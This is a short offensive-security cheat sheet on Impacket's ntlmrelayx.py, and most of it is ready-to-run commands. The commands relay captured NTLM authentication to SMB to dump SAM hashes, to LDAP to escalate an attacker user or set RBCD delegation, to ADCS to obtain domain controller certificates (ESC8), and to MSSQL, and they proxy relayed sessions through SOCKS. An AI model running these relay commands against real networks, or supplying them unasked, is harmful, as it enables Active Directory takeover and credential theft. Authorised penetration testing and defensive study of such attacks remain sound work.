# 04.03 Impacket ntlmrelayx.py

> Catch incoming NTLM auth and relay it to a target — escalate to LDAP, ADCS, SMB, MSSQL operations.

## Overview

ntlmrelayx.py is the relay engine. Listens for incoming NTLM auth (from Responder, mitm6, PetitPotam coercion), relays to a specified target without ever cracking the hash. Supports SMB (dump, exec), LDAP (escalate user, set RBCD, modify ACL), HTTP (ADCS ESC8), MSSQL. Pair with coercion tools for end-to-end attack chains.

## Steps

- **Step 1** - Start ntlmrelayx with relay target.
- **Step 2** - Trigger incoming NTLM auth (Responder/coerce/mitm6).
- **Step 3** - ntlmrelayx relays and performs the target operation.

## Commands

### Relay to SMB and dump SAM

```bash
impacket-ntlmrelayx -t smb://<TARGET> -smb2support
```

### Relay to many targets

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server
```

### Relay to LDAP — escalate user

```bash
impacket-ntlmrelayx -t ldap://<DC> --escalate-user <ATTACKER-USER>
```

### Relay to LDAP — set RBCD

```bash
impacket-ntlmrelayx -t ldaps://<DC> --delegate-access --escalate-user <ATTACKER-USER>
```

### Relay to ADCS HTTP (ESC8)

```bash
impacket-ntlmrelayx -t http://<CA-FQDN>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
```

### Relay to MSSQL

```bash
impacket-ntlmrelayx -t mssql://<MSSQL-SERVER> -smb2support
```

### SOCKS mode (proxy other tools through relay)

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# Use proxychains nxc with relayed sessions
proxychains -q nxc smb <TARGET> -u <RELAYED-USER> -p 'fake' --shares
```

### Multi-relay output

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server -of relay_output.txt -l loot_dir/
```
